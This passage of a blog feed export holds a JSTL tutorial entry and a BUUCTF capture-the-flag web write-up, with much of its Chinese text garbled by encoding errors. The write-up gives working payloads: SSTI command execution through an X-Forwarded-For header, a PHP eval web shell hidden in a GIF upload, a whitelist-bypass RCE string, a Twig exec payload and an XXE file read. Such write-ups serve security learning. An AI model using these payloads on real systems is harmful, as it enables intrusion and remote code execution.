class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"c"</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>chooseæ ‡ç­¾<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">å®Œæˆæ•°å­—ç¼–å·å¯¹åº”æ˜ŸæœŸå‡ æ¡ˆä¾‹</span></span><br><span class="line"><span class="xml">    1. åŸŸä¸­å­˜å‚¨ä¸€ä¸ªæ•°å­—</span></span><br><span class="line"><span class="xml">    2. ä½¿ç”¨chooseæ ‡ç­¾å–å‡ºæ•°å­—  ç›¸å½“äºswitchå£°æ˜</span></span><br><span class="line"><span class="xml">    3. ä½¿ç”¨whenæ ‡ç­¾åšæ•°å­—åˆ¤æ–­  ç›¸å½“äºcase</span></span><br><span class="line"><span class="xml">    4. otherwiseæ ‡ç­¾åšå…¶ä»–æƒ…å†µçš„å£°æ˜  ç›¸å½“äºdefault</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        request.setAttribute("number",3);</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>æ˜ŸæœŸä¸€<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==2&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>æ˜ŸæœŸäºŒ<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==3&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>æ˜ŸæœŸä¸‰<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==4&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>æ˜ŸæœŸå››<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==5&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>æ˜ŸæœŸäº”<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==6&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>æ˜ŸæœŸå…­<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:when</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number==7&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>æ˜ŸæœŸå¤©<span class="tag">&lt;/<span class="name">c:when</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">c:otherwise</span>&gt;</span>æ•°å­—è¾“å…¥æœ‰è¯¯<span class="tag">&lt;/<span class="name">c:otherwise</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:choose</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/img/JavaWeb/9-7å­¦ä¹ æ—¥è®°/1.png" alt="avatar"></p><h3 id="foreachæ ‡ç­¾"><a href="#foreachæ ‡ç­¾" class="headerlink" title="foreachæ ‡ç­¾"></a>foreachæ ‡ç­¾</h3><ul><li><p>foreachç›¸å½“äºJavaä»£ç çš„forå¾ªç¯</p><ol><li><p>å®Œæˆé‡å¤çš„æ“ä½œ</p><ul><li><p>å±æ€§ï¼š</p><ul><li><p>begin:å¼€å§‹å€¼</p></li><li><p>end:ç»“æŸå€¼</p></li><li><p>var:ä¸´æ—¶å˜é‡</p></li><li><p>step:æ­¥é•¿</p></li><li><p>varStatus:å¾ªç¯çŠ¶æ€å¯¹è±¡</p><ul><li><p>index:å®¹å™¨ä¸­å…ƒç´ çš„ç´¢å¼•ä»0å¼€å§‹</p></li><li><p>count:å¾ªç¯æ¬¡æ•°ä»1å¼€å§‹</p></li></ul></li></ul></li></ul></li><li><p>éå†å®¹å™¨</p><ul><li><p>å±æ€§ï¼š</p><ul><li><p>items:å®¹å™¨å¯¹è±¡</p></li><li><p>var:å®¹å™¨ä¸­å…ƒç´ çš„ä¸´æ—¶å˜é‡</p></li><li><p>varStatus:å¾ªç¯çŠ¶æ€å¯¹è±¡</p><ul><li><p>index:å®¹å™¨ä¸­å…ƒç´ çš„ç´¢å¼•ä»0å¼€å§‹</p></li><li><p>count:å¾ªç¯æ¬¡æ•°ä»1å¼€å§‹</p></li></ul></li></ul></li></ul></li></ol></li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">import</span>=<span class="string">"java.util.ArrayList"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">import</span>=<span class="string">"java.util.List"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"c"</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>foreachæ ‡ç­¾<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">foreachç›¸å½“äºJavaä»£ç çš„forå¾ªç¯</span></span><br><span class="line"><span class="xml">    1. å®Œæˆé‡å¤çš„æ“ä½œ</span></span><br><span class="line"><span class="xml">        for(int i=0;i<span class="tag">&lt;<span class="name">10;i++)</span></span></span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">            ä»£ç </span></span><br><span class="line"><span class="template-variable">        &#125;</span></span><br><span class="line"><span class="xml">        Â· å±æ€§ï¼š</span></span><br><span class="line"><span class="xml">            begin:å¼€å§‹å€¼</span></span><br><span class="line"><span class="xml">            end:ç»“æŸå€¼</span></span><br><span class="line"><span class="xml">            var:ä¸´æ—¶å˜é‡</span></span><br><span class="line"><span class="xml">            step:æ­¥é•¿</span></span><br><span class="line"><span class="xml">            varStatus:å¾ªç¯çŠ¶æ€å¯¹è±¡</span></span><br><span class="line"><span class="xml">                index:å®¹å™¨ä¸­å…ƒç´ çš„ç´¢å¼•ä»0å¼€å§‹</span></span><br><span class="line"><span class="xml">                count:å¾ªç¯æ¬¡æ•°ä»1å¼€å§‹</span></span><br><span class="line"><span class="xml">    2. éå†å®¹å™¨</span></span><br><span class="line"><span class="xml">        List<span class="tag">&lt;<span class="name">User</span>&gt;</span> list;</span></span><br><span class="line"><span class="xml">        for(User user:list)</span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">            ä»£ç </span></span><br><span class="line"><span class="template-variable">        &#125;</span></span><br><span class="line"><span class="xml">        Â· å±æ€§ï¼š</span></span><br><span class="line"><span class="xml">            items:å®¹å™¨å¯¹è±¡</span></span><br><span class="line"><span class="xml">            var:å®¹å™¨ä¸­å…ƒç´ çš„ä¸´æ—¶å˜é‡</span></span><br><span class="line"><span class="xml">            varStatus:å¾ªç¯çŠ¶æ€å¯¹è±¡</span></span><br><span class="line"><span class="xml">                index:å®¹å™¨ä¸­å…ƒç´ çš„ç´¢å¼•ä»0å¼€å§‹</span></span><br><span class="line"><span class="xml">                count:å¾ªç¯æ¬¡æ•°ä»1å¼€å§‹</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">begin</span>=<span class="string">"1"</span> <span class="attr">end</span>=<span class="string">"10"</span> <span class="attr">var</span>=<span class="string">"i"</span> <span class="attr">step</span>=<span class="string">"2"</span> <span class="attr">varStatus</span>=<span class="string">"s"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    $</span><span class="template-variable">&#123;i&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>$</span><span class="template-variable">&#123;s.index&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span> <span class="tag">&lt;<span class="name">h4</span>&gt;</span>$</span><span class="template-variable">&#123;s.count&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h4</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        List list=new ArrayList();</span></span><br><span class="line"><span class="xml">        list.add("aaa");</span></span><br><span class="line"><span class="xml">        list.add("bbb");</span></span><br><span class="line"><span class="xml">        list.add("ccc");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        request.setAttribute("list",list);</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;list&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"str"</span> <span class="attr">varStatus</span>=<span class="string">"s"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        $</span><span class="template-variable">&#123;s.index&#125;</span><span class="xml"> $</span><span class="template-variable">&#123;s.count&#125;</span><span class="xml"> $</span><span class="template-variable">&#123;str&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/img/JavaWeb/9-7å­¦ä¹ æ—¥è®°/2.png" alt="avatar"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;del&gt;é¸½äº†ä¸€ä¸ªæœˆï¼Œæˆ‘åˆå›æ¥äº†&lt;/del&gt;&lt;/p&gt;
&lt;h1 id=&quot;JSTL&quot;&gt;&lt;a href=&quot;#JSTL&quot; class=&quot;headerlink&quot; title=&quot;JSTL&quot;&gt;&lt;/a&gt;JSTL&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æ¦‚å¿µï¼šJavaServer Pages Tag
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-Nepnep-WEB-3</title>
    <link href="http://yoursite.com/2020/09/07/BUUCTF-Nepnep-WEB-3/"/>
    <id>http://yoursite.com/2020/09/07/BUUCTF-Nepnep-WEB-3/</id>
    <published>2020-09-07T00:59:00.000Z</published>
    <updated>2020-09-07T02:02:17.042Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>æ‰“å¼€ä¹‹åæŸ¥çœ‹ä¸€ä¸‹Hint,åœ¨æºç é‡Œçœ‹åˆ°æç¤º</p><p>æŠ“åŒ…ï¼Œåœ¨flag.phpä¸­æ·»åŠ X-Forwarded-Forå¤´</p><p>å‘ç°IPå¯æ§ï¼Œé‚£å°±åŸºæœ¬ä¸Šæ˜¯æ³¨å…¥é¢˜äº†ï¼Œå¸¸è§çš„SQLæ³¨å…¥è¯•äº†ä¸€éä¹‹åï¼Œå‘ç°æ²¡ä»€ä¹ˆç”¨ï¼Œè€ƒè™‘æ¨¡æ¿æ³¨å…¥</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼š&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span><br><span class="line">ç»“æœï¼š<span class="number">49</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç¡®å®šæ˜¯SSTIæ³¨å…¥äº†</p><p>payload<br><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">X</span>-Forwarded-For: <span class="meta">&#123;system(</span><span class="string">"cat /flag"</span>)&#125;</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°flag</p><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>æ‰“å¼€æ˜¯ä¸ªä¸Šä¼ ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡å’ŒPHPè¯•è¯•</p><p>ä¸Šä¼ PHPå¾—åˆ°åç¼€åä¸èƒ½æœ‰phï¼</p><p>æ‰€ä»¥å¯ä»¥ç¡®å®šphæ˜¯è¢«banæ‰äº†</p><p>å’Œä¹‹å‰åšè¿‡çš„é¢˜ä¸€æ ·ï¼Œè¯•è¯•å›¾ç‰‡é©¬</p><p>ä¸Šä¼ .htaccessæ–‡ä»¶ ç±»å‹æ”¹æˆimage/jpeg</p><p><img src="/img/Nepnep/BabyUpload.png" alt="avatar"></p><p>æ¥ç€ä¸Šä¼ å›¾ç‰‡é©¬</p><p>è¦æ³¨æ„çš„æ˜¯ç”±äºå¤´ä¸èƒ½ä¸ºphå¼€å¤´ï¼Œæ‰€ä»¥ç”¨scriptæ¥ä»£æ›¿<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'attack'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>å¾—åˆ°è·¯å¾„è®¿é—®ä¸€ä¸‹,æ²¡é—®é¢˜ç”¨èšå‰‘è¿æ¥</p><p>æ ¹ç›®å½•å¾—åˆ°flag</p><h1 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h1><p>æ‰“å¼€ä»£ç å®¡è®¡ï¼Œbanæ‰äº†å¾ˆå¤šä¸œè¥¿ï¼Œè®¾ç½®äº†ä¸ªç™½åå•ï¼ŒåŸºæœ¬éƒ½æ˜¯æ•°å­¦å‡½æ•°ï¼Œé™åˆ¶äº†é•¿åº¦ä¸èƒ½è¶…è¿‡80</p><p>æœä¸€ä¸‹ç™½åå•é‡Œæ²¡è§è¿‡çš„å‡½æ•°</p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">base_convert</span>() å‡½æ•°åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—  <span class="selector-tag">base_convert</span>(number,frombase,tobase);</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">decbin</span>() å‡½æ•°æŠŠåè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">dechex</span>() å‡½æ•°æŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">decoct</span>() å‡½æ•°æŠŠåè¿›åˆ¶è½¬æ¢ä¸ºå…«è¿›åˆ¶</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">deg2rad</span>() å‡½æ•°å°†è§’åº¦è½¬æ¢ä¸ºå¼§åº¦</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">hexdec</span>() å‡½æ•°æŠŠåå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>æœ‰ä¸€ä¸ªå‡½æ•°hex2binï¼Œå¯ä»¥å°†16è¿›åˆ¶æ•°è½¬æ¢ä¸ºasciiï¼Œä½†æ˜¯ç”±äºä¸åœ¨ç™½åå•å†…ï¼Œæ‰€ä»¥è¦è½¬æ¢ä¸€ä¸‹</p><p>ç”±äºåªèƒ½ä½¿ç”¨æ•°å­—ï¼Œæ‰€ä»¥10è¿›åˆ¶æ˜¯ä¸ªé€‰æ‹©ï¼Œæ¥ç€36è¿›åˆ¶å¯ä»¥åŒ…å«æ•°å­—å’Œå­—ç¬¦ï¼Œæ‰€ä»¥å°†hex2binè¿›è¡Œè½¬æ¢<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt;hex2bin</span><br></pre></td></tr></table></figure></p><p>æ¥ç€å°±æ˜¯æ„å»º16è¿›åˆ¶æ•°çš„_GETäº†<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">dechex</span><span class="params">(<span class="number">1598506324</span>)</span></span> =&gt;<span class="number">5</span>f474554</span><br><span class="line"><span class="function"><span class="title">hex2bin</span><span class="params">(<span class="string">"5f474554"</span>)</span></span> =&gt; _GET</span><br></pre></td></tr></table></figure><br>åˆ©ç”¨PHPçš„ç‰¹æ€§ï¼Œæ„é€ payload</p><p>$$piè§£æä¸º$_GET,{}ä»£æ›¿äº†[]ï¼Œä»è€Œå®ç°äº†rce</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="symbol">$</span><span class="built-in">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">abs</span>&#125;)&amp;<span class="built-in">pi</span>=<span class="keyword">system</span>&amp;<span class="built-in">abs</span>=tac /flag</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>æ‰“å¼€ä¹‹åï¼ŒæŸ¥çœ‹Hintï¼Œå¹¶åœ¨Flagè¯•ä¸€ä¸‹æ¨¡æ¿æ³¨å…¥</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*'<span class="number">7</span>'&#125;&#125; å›æ˜¾<span class="number">7777777</span> ==&gt; Jinja2</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="number">7</span>*'<span class="number">7</span>'&#125;&#125; å›æ˜¾<span class="number">49</span> ==&gt; Twig</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯æ¨¡æ¿æ³¨å…¥çš„é—®é¢˜<br><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a></p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« <br>payload<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°flag</p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>æ‰“å¼€ä¹‹åï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°æ˜¯XMLï¼Œè€ƒè™‘XXE<br>å‚è€ƒä¸€ä¸‹<br><a href="https://www.freebuf.com/vuls/175451.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/175451.html</a></p><p>æ„é€ ä¸€ä¸‹å¤–éƒ¨å®ä½“æ”»å‡»</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY admin SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;admin;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BJDCTF2020-The-mystery-of-ip&quot;&gt;&lt;a href=&quot;#BJDCTF2020-The-mystery-of-ip&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]The mystery of ip&quot;&gt;&lt;/a&gt;[
      
    
    </summary>
    
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
      <category term="WEB" scheme="http://yoursite.com/categories/WP/WEB/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Nepnep" scheme="http://yoursite.com/tags/Nepnep/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-Nepnep-WEB-2</title>
    <link href="http://yoursite.com/2020/08/21/BUUCTF-Nepnep-WEB-2/"/>
    <id>http://yoursite.com/2020/08/21/BUUCTF-Nepnep-WEB-2/</id>
    <published>2020-08-21T04:34:00.000Z</published>
    <updated>2020-08-21T04:34:41.599Z</updated>
    
